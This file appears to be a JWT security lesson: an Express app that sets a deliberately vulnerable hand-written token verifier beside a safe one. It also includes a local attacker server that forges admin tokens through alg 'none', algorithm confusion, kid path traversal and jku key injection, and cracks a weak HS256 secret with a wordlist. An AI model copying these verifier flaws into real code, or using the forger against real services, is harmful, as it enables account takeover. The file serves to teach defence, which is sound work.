const express = require("express");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const assert = require("assert");
const jwt = require("jsonwebtoken");

const PORT = Number(process.env.PORT) || 3000;
// The attacker's server runs from this same file on the next port: it hosts a fake JWKS and a token-forging toolkit
const ATTACKER_PORT = PORT + 1;
const BASE_URL = `http://localhost:${PORT}`;
const ATTACKER_URL = `http://127.0.0.1:${ATTACKER_PORT}`;
const ISSUER = "chaicart-auth";
const AUDIENCE = "chaicart-api";
const MAX_TOKEN_LENGTH = 4096; // a JWT is a few hundred bytes. Don't even parse a 1 MB "token".

// ---------- Keys ----------
// RS256 (topic 18): we sign with the PRIVATE key, anyone can verify with the PUBLIC key from our JWKS.
// shortcut: a new key pair on every start. A real app loads it from a secrets manager and rotates it (topic 54).
const { privateKey: PRIVATE_KEY, publicKey: PUBLIC_KEY } = crypto.generateKeyPairSync("rsa", {
  modulusLength: 2048,
  publicKeyEncoding: { type: "spki", format: "pem" },
  privateKeyEncoding: { type: "pkcs8", format: "pem" },
});
// ✅ The ONLY keys the safe verifier knows. Each kid is tied to ONE algorithm, chosen by us, never by the token.
const KEYS = { "rs-1": { alg: "RS256", key: PUBLIC_KEY } };

// ❌ ATTACK 5: the old v1 API signs HS256 with a short, guessable secret. The verify code is perfect, the SECRET isn't.
const WEAK_LEGACY_SECRET = "chaicart123";

// ---------- "Database" ----------
// shortcut: in-memory Map with test accounts, lost on restart. A real app uses a users table (topic 06).
const users = new Map(); // email -> { id, email, role, salt, passwordHash }
for (const [email, password, role] of [["vikram@mail.com", "vikram-pass-99", "user"], ["priya@mail.com", "priya-admin-77", "admin"]]) {
  const salt = crypto.randomBytes(16);
  users.set(email, { id: `u_${users.size + 1}`, email, role, salt, passwordHash: crypto.scryptSync(password, salt, 64) });
}
const DUMMY_SALT = crypto.randomBytes(16);

// ---------- Helpers ----------
const str = (v) => (typeof v === "string" ? v : undefined);
const b64json = (obj) => Buffer.from(JSON.stringify(obj)).toString("base64url");
const unb64json = (part) => JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
const hmac = (secret, data) => crypto.createHmac("sha256", secret).update(data).digest("base64url");

function checkPassword(body) {
  const email = str(body?.email)?.trim().toLowerCase();
  const user = email ? users.get(email) : undefined;
  // Hash even for unknown emails so the response time doesn't reveal who has an account (topic 51)
  const hash = crypto.scryptSync(str(body?.password) ?? "", user?.salt ?? DUMMY_SALT, 64);
  return user && crypto.timingSafeEqual(hash, user.passwordHash) ? user : null;
}
const claimsFor = (user) => ({ email: user.email, role: user.role });
const signOptions = (user) => ({ issuer: ISSUER, audience: AUDIENCE, subject: user.id, expiresIn: "15m" });

// ======================================================================
// ❌ THE VULNERABLE VERIFIER: hand-written, and it trusts the token to tell it how to check the token.
// Every line marked ❌ is a real bug that has shipped in real libraries or apps.
// ======================================================================
async function verifyVulnerable(token) {
  const [h, p, s] = token.split(".");
  const header = unb64json(h);
  const payload = unb64json(p);
  const data = `${h}.${p}`;

  // ❌ ATTACK 1: alg "none". The header says "I'm not signed", and the code agrees.
  if (header.alg === "none") return payload;

  // ❌ The HEADER chooses the key.
  let key;
  if (header.jku) {
    // ❌ ATTACK 4: jku = "my keys are at this URL". The code downloads the ATTACKER's keys (and is an SSRF hole too).
    const { keys } = await (await fetch(header.jku, { signal: AbortSignal.timeout(2000) })).json();
    key = crypto.createPublicKey({ key: keys.find((k) => k.kid === header.kid), format: "jwk" }).export({ type: "spki", format: "pem" });
  } else if (header.kid === "rs-1") {
    key = PUBLIC_KEY;
  } else {
    // ❌ ATTACK 3: "rotated-out keys live in files named after their kid". kid "../package.json" reads a PUBLIC file.
    key = fs.readFileSync(path.join(__dirname, "old-keys", String(header.kid)), "utf8");
  }

  // ❌ ATTACK 2: the HEADER chooses the algorithm. "HS256" + our RSA public key = HMAC with a secret everyone knows.
  let ok = false;
  if (header.alg === "HS256") ok = hmac(key, data) === s; // ❌ also a non-constant-time compare
  else if (header.alg === "RS256") ok = crypto.verify("sha256", Buffer.from(data), key, Buffer.from(s, "base64url"));
  if (!ok) throw new Error("bad signature");

  // ❌ And it never checks exp, iss or aud: an expired token, or one made for another app, still works.
  return payload;
}

// ======================================================================
// ✅ THE SAFE VERIFIER: we decide the key and the algorithm. The token only gets to say WHICH of our keys (kid).
// ======================================================================
function verifySafe(token) {
  if (token.length > MAX_TOKEN_LENGTH) throw new Error("token too long");
  const kid = jwt.decode(token, { complete: true })?.header?.kid;
  // Step 1: kid is only a LOOKUP KEY into our own fixed map. Never a file path, URL, or SQL. jku/jwk/x5u are ignored.
  if (typeof kid !== "string" || !Object.hasOwn(KEYS, kid)) throw new Error(`unknown kid "${kid}"`);
  const { alg, key } = KEYS[kid];
  // Step 2: algorithms pinned to that key's algorithm. Blocks "none" and HS256-with-our-public-key.
  // Step 3: iss, aud and exp (with 30 s of clock tolerance) are checked too (topic 27).
  return jwt.verify(token, key, { algorithms: [alg], issuer: ISSUER, audience: AUDIENCE, clockTolerance: 30 });
}

// ---------- App ----------
const app = express();
app.use(express.json({ limit: "10kb" }));
app.use((req, res, next) => { res.set("Cache-Control", "no-store"); next(); });

const bearer = (req) => req.get("authorization")?.match(/^Bearer (\S+)$/)?.[1];

// One middleware, two verifiers, so you can send the SAME forged token to both and compare
const requireAdmin = (verify) => async (req, res, next) => {
  const token = bearer(req);
  if (!token) return res.status(401).json({ error: "Missing Bearer token" });
  try {
    req.auth = await verify(token);
  } catch (err) {
    console.log(`❌ ${req.path} rejected a token: ${err.message}`);
    // shortcut: debugReason is for learning. In production the client gets only the generic error (topic 27).
    return res.status(401).json({ error: "Invalid token", debugReason: err.message });
  }
  if (req.auth.role !== "admin") return res.status(403).json({ error: "Admins only", you: req.auth.email });
  next();
};

app.post("/login", (req, res) => {
  const user = checkPassword(req.body);
  if (!user) return res.status(401).json({ error: "Wrong email or password" });
  const token = jwt.sign(claimsFor(user), PRIVATE_KEY, { algorithm: "RS256", keyid: "rs-1", ...signOptions(user) });
  res.json({ token });
});

// The public half of our key. It's SUPPOSED to be public, which is exactly why algorithm confusion works.
app.get("/.well-known/jwks.json", (req, res) => {
  res.json({ keys: [{ ...crypto.createPublicKey(PUBLIC_KEY).export({ format: "jwk" }), kid: "rs-1", alg: "RS256", use: "sig" }] });
});

const adminPanel = (req, res) => res.json({
  message: `Welcome to the admin panel, ${req.auth.email}`,
  allUsers: [...users.values()].map((u) => `${u.email} (${u.role})`),
});
app.get("/vulnerable/admin", requireAdmin(verifyVulnerable), adminPanel); // ❌
app.get("/admin", requireAdmin(verifySafe), adminPanel);                  // ✅

// The old v1 API: verification is done RIGHT (pinned alg, iss, aud, exp), but the secret is guessable
app.post("/legacy/login", (req, res) => {
  const user = checkPassword(req.body);
  if (!user) return res.status(401).json({ error: "Wrong email or password" });
  res.json({ token: jwt.sign(claimsFor(user), WEAK_LEGACY_SECRET, { algorithm: "HS256", ...signOptions(user) }) });
});
app.get("/legacy/admin", requireAdmin((t) => jwt.verify(t, WEAK_LEGACY_SECRET, { algorithms: ["HS256"], issuer: ISSUER, audience: AUDIENCE })), adminPanel);

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// Errors (bad JSON, body too big, bugs) come here. Never send the stack trace to the client.
app.use((err, req, res, next) => {
  if (err.type === "entity.parse.failed") return res.status(400).json({ error: "Body must be valid JSON" });
  if (err.type === "entity.too.large") return res.status(413).json({ error: "Request body too large" });
  console.error(err);
  res.status(500).json({ error: "Something went wrong" });
});

// ======================================================================
// 😈 THE ATTACKER'S SERVER: Vikram has a normal user account and wants admin.
// Everything here uses only PUBLIC information: his own token, our JWKS, a public file, a wordlist.
// ======================================================================
const { privateKey: EVIL_PRIVATE, publicKey: EVIL_PUBLIC } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
// shortcut: 20 words. Real attackers run hashcat with rockyou.txt (14 million words) at billions of guesses per second on a GPU.
const WORDLIST = ["123456", "password", "secret", "jwt-secret", "changeme", "admin", "qwerty", "letmein", "your-256-bit-secret",
  "supersecret", "secretkey", "mysecret", "chaicart", "chaicart1", "chaicart123", "chaicart@123", "test", "dev", "key", "s3cr3t"];

async function forge(attack, token, claims) {
  const [h, p, s] = String(token).split(".");
  const payload = { ...unb64json(p), ...claims }; // copy Vikram's real claims (iss, aud, exp…), then change what he wants
  const make = (header, sign) => { const data = `${b64json(header)}.${b64json(payload)}`; return `${data}.${sign(data)}`; };

  switch (attack) {
    case "none": // ATTACK 1: no signature at all. Note the token ends with a dot.
      return { token: make({ ...unb64json(h), alg: "none" }, () => "") };
    case "confusion": { // ATTACK 2: download the PUBLIC key, use it as an HMAC secret
      const { keys } = await (await fetch(`${BASE_URL}/.well-known/jwks.json`)).json();
      const publicPem = crypto.createPublicKey({ key: keys[0], format: "jwk" }).export({ type: "spki", format: "pem" });
      return { token: make({ alg: "HS256", typ: "JWT", kid: keys[0].kid }, (d) => hmac(publicPem, d)) };
    }
    case "kid": { // ATTACK 3: point kid at a file whose content he knows. package.json is public on GitHub.
      const knownFile = fs.readFileSync(path.join(__dirname, "package.json"), "utf8");
      return { token: make({ alg: "HS256", typ: "JWT", kid: "../package.json" }, (d) => hmac(knownFile, d)) };
    }
    case "jku": // ATTACK 4: sign with HIS private key, and tell the server where to find HIS public key
      return { token: make({ alg: "RS256", typ: "JWT", kid: "evil-1", jku: `${ATTACKER_URL}/jwks.json` },
        (d) => crypto.sign("sha256", Buffer.from(d), EVIL_PRIVATE).toString("base64url")) };
    case "crack": { // ATTACK 5: offline guessing. Each guess is one HMAC, no server involved, no rate limit possible.
      const secret = WORDLIST.find((w) => hmac(w, `${h}.${p}`) === s);
      if (!secret) return { error: `Not cracked: none of the ${WORDLIST.length} words matched` };
      return { secret, token: make(unb64json(h), (d) => hmac(secret, d)) };
    }
    default:
      return { error: "attack must be none, confusion, kid, jku or crack" };
  }
}

const evil = express();
evil.use(express.json({ limit: "10kb" }));
evil.get("/jwks.json", (req, res) => res.json({ keys: [{ ...EVIL_PUBLIC.export({ format: "jwk" }), kid: "evil-1", alg: "RS256" }] }));
evil.post("/forge/:attack", async (req, res) => {
  if (!str(req.body?.token)) return res.status(400).json({ error: "Send { token, claims }" });
  try {
    const out = await forge(req.params.attack, req.body.token, req.body.claims ?? {});
    res.status(out.error ? 400 : 200).json(out);
  } catch (err) {
    res.status(400).json({ error: `Could not forge: ${err.message}` });
  }
});
evil.use((req, res) => res.status(404).json({ error: "Not found" }));

// ---------- Self-check: every attack must beat the vulnerable verifier and lose to the safe one ----------
async function selfCheck() {
  const vikram = users.get("vikram@mail.com");
  const real = jwt.sign(claimsFor(vikram), PRIVATE_KEY, { algorithm: "RS256", keyid: "rs-1", ...signOptions(vikram) });
  const accepts = async (verify, t) => { try { await verify(t); return true; } catch { return false; } };

  assert(await accepts(verifySafe, real), "safe verifier must accept a real token");
  for (const attack of ["none", "confusion", "kid", "jku"]) {
    const { token } = await forge(attack, real, { role: "admin" });
    assert((await verifyVulnerable(token)).role === "admin", `${attack}: vulnerable verifier should be fooled`);
    assert(!(await accepts(verifySafe, token)), `${attack}: safe verifier must reject`);
  }
  const expired = jwt.sign({ ...claimsFor(vikram), exp: Math.floor(Date.now() / 1000) - 3600 }, PRIVATE_KEY,
    { algorithm: "RS256", keyid: "rs-1", issuer: ISSUER, audience: AUDIENCE, subject: vikram.id });
  assert(await accepts(verifyVulnerable, expired) && !(await accepts(verifySafe, expired)), "expired: only the vulnerable one accepts");
  const weak = jwt.sign(claimsFor(vikram), WEAK_LEGACY_SECRET, { algorithm: "HS256", ...signOptions(vikram) });
  const strong = jwt.sign(claimsFor(vikram), crypto.randomBytes(32), { algorithm: "HS256", ...signOptions(vikram) });
  assert((await forge("crack", weak, {})).secret === WEAK_LEGACY_SECRET, "weak secret should crack");
  assert((await forge("crack", strong, {})).error, "a 256-bit random secret must not crack");
  console.log("✅ Self-check passed: none, alg confusion, kid traversal, jku, expired and weak-secret attacks behave as expected");
}

app.listen(PORT, () => {
  console.log(`🛒 ChaiCart API on ${BASE_URL}`);
  evil.listen(ATTACKER_PORT, () => {
    console.log(`😈 Attacker server on ${ATTACKER_URL} (fake JWKS: /jwks.json, toolkit: POST /forge/:attack)`);
    selfCheck().catch((err) => { console.error("❌ Self-check failed:", err.message); process.exit(1); });
  });
});
